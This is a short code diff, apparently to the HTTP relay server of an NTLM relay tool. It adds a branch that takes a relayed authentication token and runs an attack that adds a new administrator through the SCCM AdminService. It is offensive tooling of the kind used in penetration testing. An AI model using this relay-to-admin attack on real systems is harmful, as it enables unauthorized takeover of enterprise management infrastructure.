@@ -462,6 +462,17 @@ class HTTPRelayServer(Thread):
                     self.authUser = authenticateMessage.getUserString()
                     target = '%s://%s@%s' % (self.target.scheme, self.authUser.replace("/", '\\'), self.target.netloc)
 
+                # when relaying to the SCCM AdminService to add a new administrator,
+                # we need to break out of the normal relay auth flow and
+                # perform the attack all in one shot
+                if self.server.config.isADMINAttack:
+                    LOG.info("Exiting standard auth flow to add SCCM admin...")
+                    self.server.config.setSCCMAdminToken(token)
+                    LOG.info("HTTPD(%s): Authenticating against %s://%s as %s" % (self.server.server_address[1],
+                        self.target.scheme, self.target.netloc, self.authUser))
+                    self.do_attack()
+                    return
+
                 LOG.info("(HTTP): Calling do_ntlm_auth for %s" % self.authUser)
                 if not self.do_ntlm_auth(token, authenticateMessage):
                     LOG.error("(HTTP): Authenticating against %s://%s as %s FAILED" % (self.target.scheme, self.target.netloc, self.authUser))
